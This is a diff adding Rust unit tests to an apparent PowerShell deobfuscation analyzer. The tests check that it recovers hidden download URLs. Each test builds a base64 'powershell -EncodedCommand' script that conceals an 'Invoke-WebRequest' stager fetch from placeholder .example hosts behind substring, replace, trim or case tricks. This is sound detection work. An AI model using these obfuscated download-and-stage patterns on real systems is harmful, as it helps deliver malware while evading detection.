@@ -22586,6 +22586,182 @@ Invoke-Expression $cmd"#,
     }
 
     #[test]
+    fn ps1_literal_substring_extractor_without_return_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-extractor-implicit.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($value,$start,$count) {{
+  $value.Substring($start,$count)
+}}
+Pick '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-extractor-implicit.example/stage.ps1"
+                )
+            }),
+            "implicit-output substring extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_substring_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-substring-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($unused,$value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick 0 '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-reordered-substring-extractor.example/stage.ps1"
+                )
+            }),
+            "literal reordered substring extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~o~r~d~e~r~e~d~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($unused,$value,$needle,$replacement) {{
+  return $value -replace $needle,$replacement
+}}
+Clean 0 '{obfuscated}' '~' ''"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-reordered-replace-extractor.example/stage.ps1"
+                )
+            }),
+            "literal reordered replace extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_trim_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($unused,$value,$chars) {{
+  return $value.Trim($chars)
+}}
+Clean 0 '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-reordered-trim-extractor.example/stage.ps1"
+                )
+            }),
+            "literal reordered trim extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_string_case_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "invoke-webrequest -uri https://ps-reordered-lower-extractor.example/stage.ps1";
+        let inner = r#"function Lower($unused,$value) {
+  return $value.ToLower()
+}
+Lower 0 'INVOKE-WEBREQUEST -URI HTTPS://PS-REORDERED-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-reordered-lower-extractor.example/stage.ps1"
+                )
+            }),
+            "literal reordered string-case extractor call was not recursively decoded from {decoded}: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
